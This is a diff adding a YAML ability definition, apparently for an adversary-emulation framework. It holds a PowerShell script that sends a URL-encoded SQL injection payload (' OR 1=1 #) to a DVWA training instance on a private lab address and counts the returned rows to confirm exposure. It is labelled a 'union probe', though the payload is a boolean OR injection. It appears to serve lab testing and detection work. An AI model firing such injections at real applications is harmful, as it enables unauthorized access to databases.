@@ -1,0 +1,24 @@
+- id: sqli-union-probe-000000000002
+  name: DVWA SQL Injection Union Probe with Row Count Verification
+  description: >-
+    Fetches the DVWA SQLi module baseline for id=1, then a URL-encoded union probe, and verifies the response predicate by counting result rows against the baseline. An HTTP 200 alone is never treated as success.
+  technique_id: T1190
+  technique_name: Exploit Public-Facing Application
+  repeatable: false
+  executors:
+    - name: psh
+      platform: windows
+      command: |
+        $ErrorActionPreference = 'Stop'
+        $base = 'http://192.168.1.150:8080/dvwa'
+        $jar = 'C:\SOC-Lab\WEB\demo\session.txt'
+        if (-not (Test-Path $jar)) { Write-Output 'WEB01_SQLI_ERROR session_missing'; exit 1 }
+        $baseline = (curl.exe -s -b $jar "$base/vulnerabilities/sqli/?id=1&Submit=Submit") -join "`n"
+        $inject = (curl.exe -s -b $jar "$base/vulnerabilities/sqli/?id=%27+OR+1%3D1+%23&Submit=Submit") -join "`n"
+        $rowsBase = ([regex]::Matches($baseline, '<pre>ID:')).Count
+        $rowsInj = ([regex]::Matches($inject, '<pre>ID:')).Count
+        Write-Output ("WEB01_SQLI baseline_rows=" + $rowsBase + " injected_rows=" + $rowsInj + " baseline_bytes=" + $baseline.Length + " injected_bytes=" + $inject.Length)
+        if ($rowsInj -ge 3 -and $rowsInj -gt $rowsBase) { Write-Output 'WEB01_SQLI_OK union_rows_exposed'; exit 0 }
+        Write-Output 'WEB01_SQLI_VERDICT_NEGATIVE predicate_not_met'
+        exit 1
+      timeout: 60
